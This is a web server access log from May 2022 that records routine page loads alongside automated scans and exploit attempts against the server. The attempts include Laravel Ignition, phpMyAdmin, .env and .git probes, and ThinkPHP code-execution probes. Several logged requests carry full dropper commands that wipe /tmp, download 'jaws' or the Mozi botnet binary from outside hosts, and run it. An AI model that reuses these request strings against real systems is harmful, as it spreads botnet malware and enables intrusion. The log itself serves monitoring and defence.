[22/May/2022 18:56:15] "GET / HTTP/1.0" 302 0
[22/May/2022 18:56:16] "GET / HTTP/1.0" 302 0
[22/May/2022 18:56:17] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 19:03:37] "GET / HTTP/1.0" 302 0
[22/May/2022 19:03:37] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /config/getuser
[22/May/2022 19:12:15] "GET /config/getuser?index=0 HTTP/1.0" 404 2198
Not Found: /MyAdmin/index.php
[22/May/2022 20:17:12] "GET /MyAdmin/index.php?lang=en HTTP/1.0" 404 2207
Not Found: /db/phpMyAdmin-5/index.php
[22/May/2022 20:17:12] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 2231
[22/May/2022 20:40:59] "GET / HTTP/1.0" 302 0
[22/May/2022 20:40:59] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 20:43:03] "GET / HTTP/1.0" 302 0
[22/May/2022 20:43:03] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 21:42:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /.env
[22/May/2022 21:50:36] "GET /.env HTTP/1.0" 404 2160
[22/May/2022 21:50:44] "GET / HTTP/1.0" 302 0
[22/May/2022 21:50:51] "GET / HTTP/1.0" 302 0
Not Found: /w00tw00t.at.blackhats.romanian.anti-sec:)
[22/May/2022 22:31:22] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.0" 404 2271
Not Found: /configuracion/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:23] "GET /configuracion/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2274
Not Found: /~phpmyadmin/scripts/setup.php
[22/May/2022 22:31:23] "GET /~phpmyadmin/scripts/setup.php HTTP/1.0" 404 2235
Not Found: /MySQL/scripts/setup.php
[22/May/2022 22:31:24] "GET /MySQL/scripts/setup.php HTTP/1.0" 404 2217
Not Found: /phpmyadmin_/scripts/setup.php
[22/May/2022 22:31:24] "GET /phpmyadmin_/scripts/setup.php HTTP/1.0" 404 2235
Not Found: /php/scripts/setup.php
[22/May/2022 22:31:25] "GET /php/scripts/setup.php HTTP/1.0" 404 2211
Not Found: /wp-phpmyadmin/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:25] "GET /wp-phpmyadmin/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2274
Not Found: /phpmy/scripts/setup.php
[22/May/2022 22:31:26] "GET /phpmy/scripts/setup.php HTTP/1.0" 404 2217
Not Found: /scripts/setup.php
[22/May/2022 22:31:26] "GET /scripts/setup.php HTTP/1.0" 404 2199
Not Found: /admin/scripts/setup.php
[22/May/2022 22:31:27] "GET /admin/scripts/setup.php HTTP/1.0" 404 3949
Not Found: /admin/pma/scripts/setup.php
[22/May/2022 22:31:27] "GET /admin/pma/scripts/setup.php HTTP/1.0" 404 3961
Not Found: /admin/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:28] "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.0" 404 3982
Not Found: /db/scripts/setup.php
[22/May/2022 22:31:28] "GET /db/scripts/setup.php HTTP/1.0" 404 2208
Not Found: /dbadmin/scripts/setup.php
[22/May/2022 22:31:29] "GET /dbadmin/scripts/setup.php HTTP/1.0" 404 2223
Not Found: /mysql/scripts/setup.php
[22/May/2022 22:31:29] "GET /mysql/scripts/setup.php HTTP/1.0" 404 2217
Not Found: /mysqladmin/scripts/setup.php
[22/May/2022 22:31:30] "GET /mysqladmin/scripts/setup.php HTTP/1.0" 404 2232
Not Found: /typo3/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:31] "GET /typo3/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2250
Not Found: /phpadmin/scripts/setup.php
[22/May/2022 22:31:31] "GET /phpadmin/scripts/setup.php HTTP/1.0" 404 2226
Not Found: /web/phpMyAdmin/scripts/setup.php
[22/May/2022 22:31:32] "GET /web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 2244
Not Found: /xampp/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:32] "GET /xampp/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2250
Not Found: /web/scripts/setup.php
[22/May/2022 22:31:33] "GET /web/scripts/setup.php HTTP/1.0" 404 2211
Not Found: /php-my-admin/scripts/setup.php
[22/May/2022 22:31:33] "GET /php-my-admin/scripts/setup.php HTTP/1.0" 404 2238
Not Found: /websql/scripts/setup.php
[22/May/2022 22:31:34] "GET /websql/scripts/setup.php HTTP/1.0" 404 2220
Not Found: /phpMyAdmin-2/scripts/setup.php
[22/May/2022 22:31:34] "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 2238
Not Found: /_phpmyadmin/scripts/setup.php
[22/May/2022 22:31:35] "GET /_phpmyadmin/scripts/setup.php HTTP/1.0" 404 2235
Not Found: /administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:35] "GET /administrator/components/com_joommyadmin/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2355
Not Found: /apache-default/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:36] "GET /apache-default/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2277
Not Found: /blog/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:36] "GET /blog/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2247
Not Found: /cpanelphpmyadmin/scripts/setup.php
[22/May/2022 22:31:37] "GET /cpanelphpmyadmin/scripts/setup.php HTTP/1.0" 404 2250
Not Found: /cpphpmyadmin/scripts/setup.php
[22/May/2022 22:31:37] "GET /cpphpmyadmin/scripts/setup.php HTTP/1.0" 404 2238
Not Found: /forum/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:38] "GET /forum/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2250
Not Found: /php/phpmyadmin/scripts/setup.php
[22/May/2022 22:31:38] "GET /php/phpmyadmin/scripts/setup.php HTTP/1.0" 404 2244
Not Found: /.env
[22/May/2022 22:43:02] "GET /.env HTTP/1.0" 404 2160
[22/May/2022 22:43:02] "POST / HTTP/1.0" 302 0
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[22/May/2022 22:43:06] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[22/May/2022 23:29:09] "GET / HTTP/1.0" 302 0
[23/May/2022 01:49:27] "GET / HTTP/1.0" 302 0
Not Found: /GponForm/diag_Form
[23/May/2022 02:02:22] "POST /GponForm/diag_Form?images/ HTTP/1.0" 404 2208
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[23/May/2022 02:28:42] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 02:43:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[23/May/2022 03:02:46] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /solr/admin/info/system
[23/May/2022 03:22:49] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /index.php
[23/May/2022 03:50:48] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[23/May/2022 04:14:18] "GET / HTTP/1.0" 302 0
[23/May/2022 04:17:51] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[23/May/2022 04:17:51] "GET /public/index.html HTTP/1.0" 200 2139
[23/May/2022 04:49:18] "GET / HTTP/1.0" 302 0
[23/May/2022 05:04:25] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[23/May/2022 05:04:25] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /onvif/device_service
[23/May/2022 05:12:54] "POST /onvif/device_service HTTP/1.0" 404 2209
Not Found: /onvif/device_service
[23/May/2022 05:13:04] "POST /onvif/device_service HTTP/1.0" 404 2209
[23/May/2022 05:17:17] "GET / HTTP/1.0" 302 0
[23/May/2022 05:17:17] "GET / HTTP/1.0" 302 0
[23/May/2022 05:17:18] "GET /public/index.html HTTP/1.0" 200 2139
[23/May/2022 05:17:18] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /console
[23/May/2022 05:17:18] "GET /console HTTP/1.0" 404 2169
[23/May/2022 05:17:50] "GET / HTTP/1.0" 302 0
[23/May/2022 05:17:50] "GET / HTTP/1.0" 302 0
[23/May/2022 05:17:50] "GET /public/index.html HTTP/1.0" 200 2139
[23/May/2022 05:17:51] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /console
[23/May/2022 05:17:51] "GET /console HTTP/1.0" 404 2169
[23/May/2022 05:43:38] "GET / HTTP/1.0" 302 0
[23/May/2022 05:47:02] "GET / HTTP/1.0" 302 0
[23/May/2022 05:48:05] "GET / HTTP/1.0" 302 0
[23/May/2022 05:48:05] "GET /public/index.html HTTP/1.0" 200 2139
[23/May/2022 05:50:22] "GET / HTTP/1.0" 302 0
[23/May/2022 05:51:15] "GET / HTTP/1.0" 302 0
Not Found: /console/
[23/May/2022 05:52:41] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[23/May/2022 05:55:35] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:00:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 06:45:38] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
Not Found: /manager/text/list
[23/May/2022 06:56:05] "GET /manager/text/list HTTP/1.0" 404 2199
[23/May/2022 07:05:52] "GET / HTTP/1.0" 302 0
[23/May/2022 07:05:53] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /manager/html
[23/May/2022 07:17:46] "GET /manager/html HTTP/1.0" 404 2184
[23/May/2022 07:43:11] "GET / HTTP/1.0" 302 0
[23/May/2022 07:43:11] "GET /public/index.html HTTP/1.0" 200 2139
[23/May/2022 08:08:07] "HEAD / HTTP/1.0" 302 0
[23/May/2022 08:13:17] "GET / HTTP/1.0" 302 0
[23/May/2022 08:18:14] "GET / HTTP/1.0" 302 0
[23/May/2022 08:18:19] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /shell
[23/May/2022 08:41:17] "GET /shell?cd+/tmp;rm+-rf+*;wget+0.0.0.0/jaws;sh+/tmp/jaws HTTP/1.0" 404 2208
Not Found: /actuator/gateway/routes
[23/May/2022 08:56:07] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
Not Found: /setup.cgi
[23/May/2022 08:57:23] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2345
[23/May/2022 10:02:32] "GET / HTTP/1.0" 302 0
[23/May/2022 11:48:03] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 11:57:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[23/May/2022 12:41:21] "GET / HTTP/1.0" 302 0
Not Found: /config/getuser
[23/May/2022 12:43:06] "GET /config/getuser?index=0 HTTP/1.0" 404 2198
[23/May/2022 13:00:38] "GET / HTTP/1.0" 302 0
[23/May/2022 13:00:38] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /webfig/
[23/May/2022 13:00:39] "GET /webfig/ HTTP/1.0" 404 2169
[23/May/2022 13:05:03] "GET / HTTP/1.0" 302 0
Not Found: /KIz89PGViACfvNpQE2eoOD5u
[23/May/2022 15:58:24] "GET /KIz89PGViACfvNpQE2eoOD5u HTTP/1.0" 404 2220
Not Found: /.git/index
[23/May/2022 16:04:38] "GET /.git/index HTTP/1.0" 404 2178
Not Found: /.svn/entries
[23/May/2022 16:04:38] "GET /.svn/entries HTTP/1.0" 404 2184
Not Found: /.env
[23/May/2022 16:04:38] "GET /.env HTTP/1.0" 404 2160
Not Found: /.env
[23/May/2022 16:57:38] "GET /.env HTTP/1.0" 404 2160
[23/May/2022 17:27:36] "GET / HTTP/1.0" 302 0
[23/May/2022 17:48:01] "GET / HTTP/1.0" 302 0
[23/May/2022 17:48:01] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[23/May/2022 18:09:17] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[23/May/2022 18:09:18] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[23/May/2022 18:09:18] "GET /storage/.env HTTP/1.0" 404 2184
[23/May/2022 18:09:19] "GET /public/.env HTTP/1.0" 404 1634
[23/May/2022 18:09:19] "POST / HTTP/1.0" 302 0
[23/May/2022 18:15:34] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[23/May/2022 18:19:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[23/May/2022 20:09:18] "GET / HTTP/1.0" 302 0
[23/May/2022 20:09:19] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /phpmyadmin/
[23/May/2022 20:35:51] "GET /phpmyadmin/ HTTP/1.0" 404 2181
Not Found: /.env
[23/May/2022 21:05:06] "GET /.env HTTP/1.0" 404 2160
[23/May/2022 21:05:08] "POST / HTTP/1.0" 302 0
Not Found: /echo.php
[23/May/2022 21:40:37] "GET /echo.php HTTP/1.0" 404 2173
[23/May/2022 22:03:18] "GET / HTTP/1.0" 302 0
[23/May/2022 22:41:09] "GET / HTTP/1.0" 302 0
[23/May/2022 23:06:26] "GET / HTTP/1.0" 302 0
[23/May/2022 23:12:19] "GET / HTTP/1.0" 302 0
Not Found: /solr/
[23/May/2022 23:36:03] "GET /solr/ HTTP/1.0" 404 2163
[23/May/2022 23:49:09] "GET / HTTP/1.0" 302 0
[23/May/2022 23:49:09] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 00:11:05] "GET / HTTP/1.0" 302 0
[24/May/2022 00:11:05] "GET / HTTP/1.0" 302 0
[24/May/2022 00:11:06] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[24/May/2022 00:26:03] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /iXJR
[24/May/2022 00:38:00] "GET /iXJR HTTP/1.0" 404 2160
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[24/May/2022 00:42:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[24/May/2022 00:48:02] "GET / HTTP/1.0" 302 0
Not Found: /setup.cgi
[24/May/2022 00:49:55] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.132.4.248:51264/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2348
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[24/May/2022 01:02:05] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /solr/admin/info/system
[24/May/2022 01:28:44] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
Not Found: /index.php
[24/May/2022 02:00:39] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[24/May/2022 02:20:01] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[24/May/2022 02:20:05] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 03:35:42] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[24/May/2022 03:35:55] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /fuN3
[24/May/2022 03:41:50] "GET /fuN3 HTTP/1.0" 404 2168
Not Found: /console/
[24/May/2022 03:47:09] "GET /console/ HTTP/1.0" 404 2172
[24/May/2022 03:48:48] "GET / HTTP/1.0" 302 0
[24/May/2022 03:48:48] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[24/May/2022 03:48:48] "GET /HNAP1/ HTTP/1.0" 404 2166
[24/May/2022 03:52:33] "GET / HTTP/1.0" 302 0
[24/May/2022 04:06:54] "GET / HTTP/1.0" 302 0
[24/May/2022 04:35:51] "GET / HTTP/1.0" 302 0
[24/May/2022 04:35:51] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /Autodiscover/Autodiscover.xml
[24/May/2022 04:36:48] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /_ignition/execute-solution
[24/May/2022 04:55:55] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[24/May/2022 05:44:19] "GET / HTTP/1.0" 302 0
[24/May/2022 05:44:23] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 05:54:42] "GET / HTTP/1.0" 302 0
[24/May/2022 06:02:12] "GET / HTTP/1.0" 302 0
[24/May/2022 06:02:12] "GET /public/index.html HTTP/1.0" 200 2139
[24/May/2022 06:04:24] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[24/May/2022 06:04:24] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
